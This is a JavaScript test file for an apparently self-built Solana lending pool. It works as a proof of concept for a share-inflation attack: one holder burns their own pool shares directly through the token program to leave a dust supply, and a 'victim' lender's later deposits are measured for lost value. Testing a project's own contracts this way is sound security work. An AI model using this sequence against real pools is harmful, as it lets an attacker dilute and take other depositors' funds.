import test from 'node:test';
import assert from 'node:assert/strict';
import { getBurnInstruction } from '/home/bills/code/dev3pack/notch/node_modules/@solana-program/token/dist/src/index.mjs';
import { USDC, depositIx, newLender, readPool, sendL, setup, tokenBalance, mintSupply } from '/home/bills/code/dev3pack/notch/tests/lib.js';
test('holder burns own shares straight through the token program -> dust supply', async () => {
  const ctx = await setup({ seed: 0n });
  const a = ctx.lender;
  assert.ok((await sendL(ctx, a, depositIx(ctx, a, 10n * USDC))).ok);
  const r = await sendL(ctx, a, getBurnInstruction({ account: a.shares, mint: ctx.juniorMint, authority: a.signer, amount: 10n * USDC - 1n }));
  console.log('direct burn ok?', r.ok, 'supply', mintSupply(ctx.svm, ctx.juniorMint), 'juniorNav', readPool(ctx.svm, ctx.pool).juniorNav);
  const v = await newLender(ctx, 100n * USDC);
  for (const amt of [5n * USDC, 19n * USDC]) {
    const before = tokenBalance(ctx.svm, v.shares);
    const rr = await sendL(ctx, v, depositIx(ctx, v, amt));
    const got = tokenBalance(ctx.svm, v.shares) - before;
    const s = mintSupply(ctx.svm, ctx.juniorMint), n = readPool(ctx.svm, ctx.pool).juniorNav;
    console.log(`victim deposit ${amt}: ok=${rr.ok} shares=${got} worth=${s ? got * n / s : 0n}`);
  }
});
